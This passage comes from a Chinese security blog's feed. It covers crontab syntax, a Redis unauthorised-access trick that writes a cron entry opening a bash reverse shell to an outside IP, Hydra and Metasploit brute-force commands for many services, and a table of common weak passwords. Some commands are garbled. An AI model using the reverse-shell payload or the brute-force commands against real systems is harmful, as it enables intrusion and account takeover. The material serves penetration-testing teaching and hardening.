myCommand</code></p></li><li><p><strong>实例4</strong>∶每隔两天的上午8点到11点的第3和第15分钟执行</p><p><code>3,15 8-11 */2 * * myCommand</code></p></li><li><p><strong>实例5</strong>:每周一上午8点到11点的第3和第15分钟执行</p><p><code>3,15 8-11 * * 1 myCommand</code></p></li><li><p><strong>实例6</strong>:每晚的21:30重启smb</p><p><code>30 21***/etc/init.d/smb restart</code></p></li><li><p><strong>实例7</strong>:每月1、10、22日的4:45重启smb</p><p><code>45 4 1,10,22 * * /etc/init.d/smb restart</code></p></li><li><p><strong>实例8</strong>:每周六、周日的1: 10重启smb</p><p><code>101 * * 6,0 /etc/init.d/ smb restart</code></p></li><li><p><strong>实例9</strong>:每天18:00至23 :00之间每隔30分钟重启smb</p><p><code>0,3018-23 * * * /etc /init.d /smb restart</code></p></li><li><p><strong>实例10</strong>:每星期六的晚上23 : 00重启smb</p><p><code>0 23 * * 6 /etc/init.d/smb restart</code></p></li><li><p><strong>实例11</strong>∶每一小时重启smb</p><p><code>* * /1 * * * / etc/init.d/smb restart</code></p></li><li><p><strong>实例12</strong>:晚上11点到早上7点之间，每隔一小时重启smb</p><p><code>0 23-7 * * * /etc/init.d/smb restart</code></p></li><li><p><strong>关于letc/crontab 及 /varlspool/cron/crontabs/$USER中定义的定时任务</strong></p><p>/etc/crontab只有 root 用户可以使用，使用时需 root 权限，而且必须指定运行用户，才会执行;</p><p><code>* * * * * root myCommand</code></p><p>/var/spool/cron/$USER 所有用户都可以使用，可以使用 crontab -u username -e 命令来直接编辑这个文件:</p><p><code>* * * * * myCommand</code></p></li></ul><p>Kali 的定时任务为 /var/spool/cron/crontabs/$USER shell 下有点问题，Ubuntu 16.10已将先前默认的 bashshell  更换为了 dashshell 。 Debian 和 Ubuntu 中，/bin/sh 默认已经指向 dash ，这是一个不同于 bash 的 shell ，它主要是为了执行脚本而出现，而不是交互，它速度更快，但功能相比 bash 要少很多，语法严格遵守 POSIX 标准。因为缺少了/bin/ls -bash 的交互特性，所以 kali 中弹不回 shell 可以得到很好的解释了。</p><p><code>ln -fs /bin/bash /bin/sh</code></p><h3 id="nc-命令教程"><a href="#nc-命令教程" class="headerlink" title="nc 命令教程"></a>nc 命令教程</h3><ul><li>nc 命令教程<br>nc被誉为网络安全界的瑞士军刀，<strong>一个简单而有用的工具</strong>，<strong>通过使用TCP或UDP协议的网络连接去读写数据</strong>。</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /ar/spool/ cron/ crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * */bin/bash -i &gt;&amp; / dev/tcp/10.211.55.2/2333 0&gt;&amp;1 \n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">认证技术的一部分。服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能越权漏洞</summary>
    
    
    
    <category term="网络安全" scheme="http://chalnl.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="http://chalnl.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="认证技术" scheme="http://chalnl.com/tags/%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>系统认证漏洞</title>
    <link href="http://chalnl.com/post/14857.html/"/>
    <id>http://chalnl.com/post/14857.html/</id>
    <published>2022-08-12T16:00:00.000Z</published>
    <updated>2022-08-19T07:00:34.828Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h1><p>身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。计算机网络世界中一切信喜，包括用户的身份信息都是用一组特定的数据来表示的,计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。<br>身份认证攻击就是为了使用各种办法通过这层认证，<strong>突破作为防护网络资产的第一道关口</strong>，身份认证攻击在<strong>渗透测试</strong>中有着举足轻重的作用。<br>对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问</p><h2 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h2><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><ul><li><strong>不怎么好用</strong><br><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></li></ul><p>俗称“九头蛇”，一款老牌的爆破工具</p><ul><li>常用命令</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FTP 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ftp:/ /192.168.0.1 -vV</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ssh: / /192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB 爆破</span></span><br><span class="line">hydra -l admin -P password.txt 10.211.55.9 smb</span><br><span class="line"></span><br><span class="line"><span class="comment"># MSSQL 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P / root/password.txt 192.168.0.1 mssql -vv</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL 爆破</span></span><br><span class="line">hydra -L /root/user.txt -P / root/password.txt 192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure><ul><li>l：导入单个用户</li><li>L ：导入一个字典</li><li>p：导入一个密码</li><li>P：导入一个密码字典</li><li>Kali自带上述命令</li></ul><h4 id="SNETCracker"><a href="#SNETCracker" class="headerlink" title="SNETCracker"></a>SNETCracker</h4><ul><li>适合国情的内网爆破工具，安全从业者必备<br>超级弱口令检查工具是一款<strong>Windows平台的弱口令审计工具</strong>，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。</li></ul><blockquote><p>SSH登录发生异常! Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies.找不到指定的模块。这个错误是因为需要这个ssh模块需要vc++2010 32位得支持，下载安装就行了。RDP错误一般是<strong>线程</strong>过多，一般建议最好<strong>在10个以内</strong>，自己慢慢试，线程多了就会出问题。</p></blockquote><ul><li>支持 <strong>RDP</strong> 爆破 <strong>3389</strong><br>远程桌面协议RDP(Remote Display Protocol）是Windows的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到Windows计算机，默认端口为3389<br>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般 Windows 服务器陌默认账户为administrator此外如果对方服务器开启了SMB445端口的话尽量优先爆破SMB（445），因为<em>RDP协议比较脆弱，经不起高速的爆破</em>。</li></ul><h4 id="御剑RDP爆破工具"><a href="#御剑RDP爆破工具" class="headerlink" title="御剑RDP爆破工具"></a>御剑RDP爆破工具</h4><ul><li>较为好用 在 github 中下架时查找历史提交记录下载</li></ul><h4 id="railgun"><a href="#railgun" class="headerlink" title="railgun"></a>railgun</h4><p><a href="https://github.com/z520520/railgun">https://github.com/z520520/railgun</a></p><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><ul><li><strong>Kali Linux系统内置Metasploit</strong>，它可以帮助用户识别安全问题，验证漏洞，并对某些软件进行安全评估，提供安全风险情报</li><li><strong>RAPID7</strong>团队出品。<strong>Offensive Security</strong>团队</li></ul><h3 id="国内常见弱口令"><a href="#国内常见弱口令" class="headerlink" title="国内常见弱口令"></a>国内常见弱口令</h3><div class="table-container"><table><thead><tr><th>Col1</th><th>Col2</th><th>Col3</th><th>Col4</th></tr></thead><tbody><tr><td>123abc</td><td>P@sswOrd</td><td>Huawei@123</td><td>mysql</td></tr><tr><td>123abc*123</td><td>P@sswOrd</td><td>Changme_123</td><td>oracle</td></tr><tr><td>123456</td><td>root@123</td><td>admin@123</td><td>root</td></tr><tr><td>abc123root123</td><td>root1234</td><td>admin</td><td>test</td></tr><tr><td>abc123456</td><td>oracle123!@#</td><td></td></tr></tbody></table></div><h3 id="常见爆破服务及端口号总结"><a href="#常见爆破服务及端口号总结" class="headerlink" title="常见爆破服务及端口号总结"></a>常见爆破服务及端口号总结</h3><div class="table-container"><table><thead><tr><th>服务名称</th><th>端口号</th><th>服务名称</th><th>端口号</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>MySQL</td><td>3360</td></tr><tr><td>Telnet</td><td>23</td><td>RDP</td><td>3389</td></tr><tr><td>SMB</td><td>445</td><td>PostgreSQL</td><td>5432</td></tr><tr><td>MSSQL</td><td>1433</td><td>Redis</td><td>6379</td></tr><tr><td>Oracle</td><td>1521</td><td>Tomcat</td><td>8080</td></tr><tr><td>MongoDb</td><td>27017</td><td></td></tr></tbody></table></div><h3 id="爆破-21-FTP"><a href="#爆破-21-FTP" class="headerlink" title="爆破 21 FTP"></a>爆破 21 FTP</h3><p>FTP(File Transfer Protocol，<strong>文件传输协议</strong>)是TCP/IP协议组中的协议之一。FTP协议包括两个组成部分，其一为<strong>FTP服务器</strong>，其二为<strong>FTP客户端</strong>。其中<strong>FTP服务器用来存储文件</strong>，用户司以使用<strong>FTP客户端通过FTP协议访问位于FTP服务器上的资源</strong>。</p><ul><li><strong>Docker快速搭建FTP环境:</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拉取镜像</span></span><br><span class="line">docker pull fauria/vsftpd</span><br><span class="line"></span><br><span class="line"><span class="comment">#构建容器</span></span><br><span class="line">docker run -d \-p 20:20 \</span><br><span class="line">-p 21:21 \</span><br><span class="line">-p 21100-21110:21100-21110 \-e FTP_USER=admin \</span><br><span class="line">-e FTP_PASS=admin \</span><br><span class="line">-e PASV_ADDRESS=10.20.24.244 \<span class="comment"># Docker 宿主机的 IP</span></span><br><span class="line">-e PASv_MIN_PORT=21100 \</span><br><span class="line">-e PASV_MAX_PORT=21100 \</span><br></pre></td></tr></table></figure><ul><li>Hydra</li><li><strong>超级弱口令爆破工具</strong></li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/ftp/ftp_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.20.24.244set username admin</span><br><span class="line"><span class="built_in">set</span> pass_file /Users/sec/Documents/Sec/ hydra/password.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-23-Telnet-比较少见"><a href="#爆破-23-Telnet-比较少见" class="headerlink" title="爆破 23 Telnet 比较少见"></a>爆破 23 Telnet 比较少见</h3><p>Telnet 协议是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机.工作的能力。用户连接上Telnet之后可以直接输入命令，然后这些命令会在服务器上运行，就像直接在控制器的控制台上输入一样。默认端口为23</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/telnet/telnet_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.211.55.9</span><br><span class="line"><span class="built_in">set</span> user_file /Users/sec/Documents/Sec/hydra/user.txt</span><br><span class="line"><span class="built_in">set</span> pass_file /Users/sec/Documents/Sec /hydra/password.txt</span><br><span class="line"><span class="built_in">set</span> threds 5   <span class="comment">#线程</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>坑点记录</strong><br>超级弱口令工具 和 Hydra 爆破 TeInet 不太行，尽量<strong>使用 MSF 爆破TeInet</strong></li></ul><h3 id="爆破-445-SMB"><a href="#爆破-445-SMB" class="headerlink" title="爆破 445 SMB"></a>爆破 445 SMB</h3><p>SMB(Server Message Block) Windows协议，用于<strong>文件和打印共享服务</strong>。默认端口为445</p><ul><li>Hydra</li><li>超级弱口令爆破工具</li><li>railgun</li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner / smb /smb_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> smbuser admin</span><br><span class="line"><span class="built_in">set</span> pass_file /root/password.txt</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>坑点记录</strong></li><li><ol><li>超级弱口令工具在爆破高版本系统比如Windows 10就不太好用:</li></ol></li><li><ol><li>Hvdra也不太行:</li></ol></li><li><ol><li>但是此时MSF依然是可以爆破的:</li></ol></li><li><ol><li>另外 SMB爆破还与防火墙是否关闭有关系，总的来说SMB爆破首选 MSF 爆破Samba也,是可以使用MSF或者Hvdra 来讲行爆破的:</li></ol></li><li><ol><li>爆破Samba也,是可以使用MSF或者Hvdra 来讲行爆破的:<br>Samba是种用来让UNIX系列的操作系统与微软Windows 操作系统的SMB网络协议做链接的自由软件。第三版不仅可访问及分享SMB的文件夹及打印机，本身还可以集成入Windows Server的网域，扮演为网域控制站以及加入Active Directory成员</li></ol></li><li><strong>Docker 快速搭建Samba环境:</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拉取镜像</span></span><br><span class="line">docker pull dpersoti/ samba</span><br><span class="line"></span><br><span class="line">docker run -it \</span><br><span class="line">--name brute_samba \     <span class="comment">#为新的容器命一个名，方便启动、停止、删除等操作，毕竟一长串字符不好输入</span></span><br><span class="line">-p 139:139 \   <span class="comment">#将主机的139端口映射到samba_docker这个容器的139端口上</span></span><br><span class="line">-p 445:445 \   <span class="comment">#将主机的445端口映射到samba_docker这个容器的445端口上</span></span><br><span class="line">-v/Users/sec/Downloads:/home/shares/shareA\   <span class="comment">#将主机上的共享目录向容器进行映射</span></span><br><span class="line">-d dperson/ samba l<span class="comment">#以dperson/ samba这个dockers镜像为模板，建立容器</span></span><br><span class="line">-w <span class="string">&quot;WORKGROUP&quot;</span> \   <span class="comment">#从这里开始是dperson/samba 的参数，上面是docker run的参数。这里指定了工作组</span></span><br><span class="line">-u <span class="string">&quot;admin ; 123456789&quot;</span>\   <span class="comment">#为samba服务设置账户和密码</span></span><br><span class="line">-s <span class="string">&quot;shareA; / home/shares/shareA; yes;no; no ; admin ;admin ; admin&quot;</span>   <span class="comment">#共享文件夹的名称;共享在samba容器中的路径;共享名称对所有工作组用户可见;不是只读(也就是说可写;不允许guest用户;指定共享的所有权用户;指定共享的超级用户;指定具有写权限的用户;</span></span><br></pre></td></tr></table></figure><h3 id="爆破-1433-MSSQL"><a href="#爆破-1433-MSSQL" class="headerlink" title="爆破 1433 MSSQL"></a>爆破 1433 MSSQL</h3><p>MSSQL是指微软<strong>的SQLServer数据库</strong>，默认端口为1433，默认最高权限用户为 sa，<strong>拿到 sa 用户权限的话，基本可以顺利提权拿到系统权限。</strong></p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/mssql/mssql_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> USERNAME sa</span><br><span class="line"><span class="built_in">set</span> PASS_FILE /root/password.txt</span><br><span class="line"><span class="built_in">set</span> THREADS 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系<strong>数据库管理系统</strong>。<strong>默认端口为1521端口</strong>，和其他数据库不同的是，爆破前得先爆破对应的SID，不过<strong>SID很多都是默认的</strong>，可以使用MSF来进行爆破。</p><ul><li><strong>Metasploit 爆破SID</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/oracle/sid_brute</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>Metasploit爆破Oracle</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/oracle/oracle_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> RPORTS 1521</span><br><span class="line"><span class="built_in">set</span> SID xXX</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-3360-MySQl"><a href="#爆破-3360-MySQl" class="headerlink" title="爆破 3360 MySQl"></a>爆破 3360 MySQl</h3><p>MySQL是一个关系型<strong>数据库管理系统</strong>，默认端口为3306<br>爆破前检测是否<strong>开启</strong>数据库外连，不要做无意义的爆破，可以手动写Python 脚本来批量验证。</p><ul><li>同一个IP 在短时间内产生太多(超过mysql数据库max_connection_errors的最大值)中断的数据库连接而导致的阻塞</li><li>此时哪怕输入正确的密码也已经无济于事了，解决方法只能重启数据库:</li></ul><h3 id="爆破-3389-RDP"><a href="#爆破-3389-RDP" class="headerlink" title="爆破 3389 RDP"></a>爆破 3389 RDP</h3><p>远程桌面协议RDP(Remote Display Protocol ）是Windows的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到Windows计算机，默认端口为 3389<br>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般Windows服务器陌<em>默认账户为administrator</em> 此外如果对方服务器开启了SMB 445端口的话尽量优先爆破SMB，<strong>因为RDP协议比较脆弱,经不起高速的爆破</strong>。</p><h3 id="爆破-5432-PostgreSQL"><a href="#爆破-5432-PostgreSQL" class="headerlink" title="爆破 5432 PostgreSQL"></a>爆破 5432 PostgreSQL</h3><p>PostgreSQL 是一种<strong>对象-关系型数据库管理系统</strong>，默认端口为 5432 可以直接使用<strong>超级弱口令工具爆破</strong>也可以使用<strong>Metasploit</strong>来进行爆破</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/ postgres/postgres_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line">RPORTS 5432</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-6379-Redis"><a href="#爆破-6379-Redis" class="headerlink" title="爆破 6379 Redis"></a>爆破 6379 Redis</h3><ul><li>redis 默认没有密码<br>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的API。默认端口为6379<br>可以直接使用超级弱口令工具爆破也可以使用Metasploit:</li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/ redis / redis_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.3</span><br><span class="line"><span class="built_in">set</span> pass_file /root/pass.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>MSF的爆破速度，大概1秒种2个字典<br>编辑配置文件，设置添加密码参数如下:<br><code>requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</code></p><blockquote><p>redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。requirepass至少长度20位以上</p></blockquote><p>重启redis服务，验证查看:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#带密码的连接格式</span></span><br><span class="line">redis-cli -h 10.211.55.4 -p 6379 -a XXXXXXXX</span><br></pre></td></tr></table></figure><ul><li><strong>还有一种不启动修改 redis 密码</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询当前密码</span></span><br><span class="line">127.0.0.1:6379&gt; config get requirepass</span><br><span class="line">1) <span class="string">&quot;requirepass&quot;</span></span><br><span class="line">2)<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置认证密码</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f2</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看密码提示没有认证的登录</span></span><br><span class="line">127.0.0.1:6379&gt;config get requirepass</span><br><span class="line">(error)NOAUTH Authentication required.</span><br><span class="line"></span><br><span class="line"><span class="comment">#auth登录下</span></span><br><span class="line">127.0.0.1:6379&gt; auth ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#再次查看密码</span></span><br><span class="line">127.0.0.1:6379 &gt; config get requirepass</span><br><span class="line">1) <span class="string">&quot; requirepass&quot;</span></span><br><span class="line">2) <span class="string">&quot;ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815&quot;</span></span><br></pre></td></tr></table></figure><p>重启后失效</p><h3 id="爆破-8080-Tomcat"><a href="#爆破-8080-Tomcat" class="headerlink" title="爆破 8080 Tomcat"></a>爆破 8080 Tomcat</h3><p>Tomcat是由 Apache 软件基金会属下Jakarta项目开发的<strong>Servlet容器</strong>，默认端口为8080<br>可以使用Burp的Basic认证爆破也可以直接使用MSF的模块来进行爆破。<strong>Tomcat令是用户名<br>在/conf/tomcat-users.xml自定义配置的，容易出现弱口令</strong>，<strong>Tomcat口令泄露的话很容易被getshell所有需要加固口令</strong>。</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line"><span class="built_in">set</span> RHosTsf 10.211.55.3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-27017-MongoDb"><a href="#爆破-27017-MongoDb" class="headerlink" title="爆破 27017 MongoDb"></a>爆破 27017 MongoDb</h3><p>MongoDB是一个基于<strong>分布式文件存储的数据库</strong>，当配置成无验证时，存在未授权访问。默认端口为 <strong>27017</strong> 可以直接使用超级弱口令工具爆破也可以使用Metasploit:</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary /scanner / mongodb/mongodb_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> RPORTS 27017</span><br><span class="line">run</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">认证技术的一部分。身份认证进行爆破攻击，主要讲解工具的使用</summary>
    
    
    
    <category term="网络安全" scheme="http://chalnl.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="http://chalnl.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="认证技术" scheme="http://chalnl.com/tags/%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/"/>
    
    <category term="爆破端口" scheme="http://chalnl.com/tags/%E7%88%86%E7%A0%B4%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>Web 认证漏洞</title>
    <link href="http://chalnl.com/post/22329.html/"/>
    <id>http://chalnl.com/post/22329.html/</id>
    <published>2022-08-11T16:00:00.000Z</published>
    <updated>2022-08-19T07:03:57.169Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BurpSuite-爆破模块详解"><a href="#BurpSuite-爆破模块详解" class="headerlink" title="BurpSuite 爆破模块详解"></a>BurpSuite 爆破模块详解</h1><p><strong>本项目的优势</strong>：</p><ol><li><strong>Docker 一键部署</strong>很方便，可以灵活的导入到 CTFd 中</li><li><strong>前面是解题提示和思路，后面带有详细的解题步骤</strong> </li><li>题目更侧重于教学，注重对选手解题的引导，而不是一味地刁难选手</li><li>详细的解题步骤转自<a href="https://www.sqlsec.com/2020/10/upload.html">国光的博客</a></li></ol><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p><strong>DockerHub 项目地址</strong>：<a href="https://hub.docker.com/r/sqlsec/ggctf-upload">https://hub.docker.com/r/sqlsec/ggctf-upload</a><br><strong>Github 项目地址</strong>：<a href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a></p><ul><li><strong>推荐使用 Ubuntu 哦</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目文件夹</span></span><br><span class="line"><span class="built_in">cd</span> upload-labs-docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键部署运行</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>默认 13 个关卡运行的端口为 30001-30013 这 13 个端口上，如果要自定义端口信息的话，自行修改 docker-compose.yml 文件即可。</p><blockquote><p>一共 13 个 Docker 容器，可能第一次部署需要一定的时间，有点硬伤， 耐心等待一下即可</p></blockquote><p><a href="https://image.3001.net/images/20201025/16035979507409.png"><img src="https://image.3001.net/images/20201025/16035979507409.png" alt="img"></a></p><h2 id="Web爆破靶场实战"><a href="#Web爆破靶场实战" class="headerlink" title="Web爆破靶场实战"></a>Web爆破靶场实战</h2><h3 id="1-简单的四位数字密码爆破"><a href="#1-简单的四位数字密码爆破" class="headerlink" title="1.简单的四位数字密码爆破"></a>1.简单的四位数字密码爆破</h3><p>用 BP 抓包发测试 <strong>Intruder</strong> 进行爆破，注意要<strong>设置密码格式</strong></p><h3 id="2-简单的弱口令密码爆破"><a href="#2-简单的弱口令密码爆破" class="headerlink" title="2.简单的弱口令密码爆破"></a>2.简单的弱口令密码爆破</h3><ul><li><strong>验证码复用</strong>漏洞<br>用 BP 抓包  输入字典进行爆破 </li></ul><h3 id="3-带验证码的密码爆破？"><a href="#3-带验证码的密码爆破？" class="headerlink" title="3.带验证码的密码爆破？"></a>3.带验证码的密码爆破？</h3><p>抓包之后 <strong>不放包</strong> 验证码不会失效 就能一直爆破了</p><h3 id="4-Basic-爆破"><a href="#4-Basic-爆破" class="headerlink" title="4.Basic 爆破"></a>4.Basic 